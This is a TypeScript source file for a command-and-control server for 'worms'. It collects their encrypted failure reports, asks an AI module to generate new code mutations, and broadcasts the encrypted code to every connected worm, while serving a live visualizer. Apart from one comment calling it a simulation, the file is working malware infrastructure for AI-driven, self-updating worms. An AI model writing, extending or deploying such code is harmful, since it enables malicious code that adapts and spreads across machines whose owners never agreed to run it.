
// This is the all-in-one C2 server that also serves the frontend visualizer.
// Fix: Changed express import to `require` and added explicit types to the handler to resolve type conflicts.
import express = require('express');
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { logger } from './utils/logger';
import { encrypt, decrypt } from './modules/crypto';
import { generateMutation } from './modules/ai';
// Fix: Corrected import path for ErrorLog to point to types/index.ts
import { ErrorLog } from '../types/index';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow all origins for this simulation
    }
});

const PORT = process.env.C2_PORT || 4000;

app.use(express.json());

// --- Static File Serving ---
// Serve the static files for the React visualizer (index.html, tsx files, etc.)
// The path needs to go up one level from `dist` (where this file runs) to the project root.
const projectRoot = path.join(__dirname, '..');
app.use(express.static(projectRoot));
// ---

// Endpoint for worms to report failures
app.post('/api/report', async (req: express.Request, res: express.Response) => {
    // Worms must provide their instance ID, encrypted log, and the key used for encryption.
    const { instanceId, payload, key } = req.body;
    
    if (!instanceId || !payload || !key) {
        logger.warn('C2 Website: Received invalid report (missing instanceId, payload, or key).');
        return res.status(400).send('Invalid report format');
    }

    try {
        const decryptedReport = decrypt(payload, key) as ErrorLog;
        if (!decryptedReport) {
            throw new Error('Decryption failed, payload may be malformed or key is incorrect.');
        }
        logger.info(`C2 Website: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);
        
        // VISUALIZER EVENT: Notify UI about the received report.
        io.emit('worm_event', {
            type: 'report',
            instanceId,
            data: decryptedReport,
        });

        // Request a new, intelligent mutation from the AI engine
        logger.info(`C2 Website: Requesting new mutation from AI engine...`);
        const aiGeneratedCode = await generateMutation(decryptedReport);

        if (!aiGeneratedCode) {
            logger.error(`C2 Website: AI Engine failed to provide a mutation. No update will be broadcast.`);
            return res.status(500).json({ message: 'AI engine failed, report received but no mutation generated.' });
        }
        
        logger.info(`C2 Website: Broadcasting AI-generated mutation to all clients.`);
        
        // Encrypt the AI-generated code with the key the worm just provided.
        const encryptedCode = encrypt({ code: aiGeneratedCode }, key);
        
        // Broadcast the encrypted payload and the key needed to decrypt it.
        io.emit('update', { payload: encryptedCode, key });
        
        // VISUALIZER EVENT: Notify UI about the broadcasted mutation.
        io.emit('worm_event', {
            type: 'mutation',
            instanceId,
            data: { mutation: `AI Generated: ${aiGeneratedCode.substring(0, 80)}...` } // Send a snippet
        });

        res.status(200).json({ message: 'Report received and AI-generated mutation broadcasted.' });

    } catch (e: any) {
        logger.error(`C2 Website: Failed to process report from ${instanceId}. Error: ${e.message}`);
        res.status(500).send('Error processing report.');
    }
});

io.on('connection', (socket) => {
    logger.info(`C2 Website: Client connected: ${socket.id}`);
    
    // VISUALIZER EVENT: Notify UI a new worm has connected.
    io.emit('worm_event', {
        type: 'connect',
        instanceId: socket.id,
        data: { wormCount: io.engine.clientsCount }
    });

    socket.on('disconnect', () => {
        logger.info(`C2 Website: Client disconnected: ${socket.id}`);
        // VISUALIZER EVENT: Notify UI a worm has disconnected.
        io.emit('worm_event', {
            type: 'disconnect',
            instanceId: socket.id,
            data: { wormCount: io.engine.clientsCount }
        });
    });
});

httpServer.listen(PORT, () => {
    logger.info(`C2 Website server is live. Visualizer at http://localhost:${PORT}`);
});
